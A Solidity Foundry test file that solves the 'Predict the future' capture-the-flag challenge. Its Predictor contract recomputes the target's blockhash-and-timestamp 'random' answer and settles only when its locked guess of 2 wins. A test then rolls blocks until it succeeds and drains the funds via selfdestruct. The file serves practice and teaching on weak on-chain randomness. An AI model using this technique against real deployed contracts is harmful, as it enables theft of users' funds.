// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/5-Predict-the-future.sol";

contract Predictor {
    PredictTheFutureChallenge target;
    address owner;

    constructor(PredictTheFutureChallenge _target){
        target = _target;
        owner = msg.sender;
    }

    function lockInGuess() external payable {
        require(msg.value == 1 ether, "Must guess with 1 ether");
        target.lockInGuess{value: 1 ether}(2);
    }

    function settle() external returns (bool) {
        require(msg.sender == owner, "Only owner can settle");
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(
                blockhash(block.number - 1), block.timestamp
            )))
         ) % 10;

        if (answer == 2) {
            target.settle();
            return true;
        }

        payable(owner).transfer(address(this).balance);

        return false;
    }

    function claim() external {
        selfdestruct(payable(owner));
    }

    receive() payable external {}
}

contract Challenge5Test is Test {
    PredictTheFutureChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new PredictTheFutureChallenge{value: 1 ether}();
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testChallenge() public {
        vm.startPrank(address(player));
        vm.roll(10);

        Predictor predictor = new Predictor(target);
        predictor.lockInGuess{value: 1 ether}();
        vm.roll(block.number + 2);

        while(!predictor.settle()) {
            vm.roll(block.number + 1);
        }
        predictor.claim();
        
        assertTrue(target.isComplete());
    }

        receive() payable external {}

}
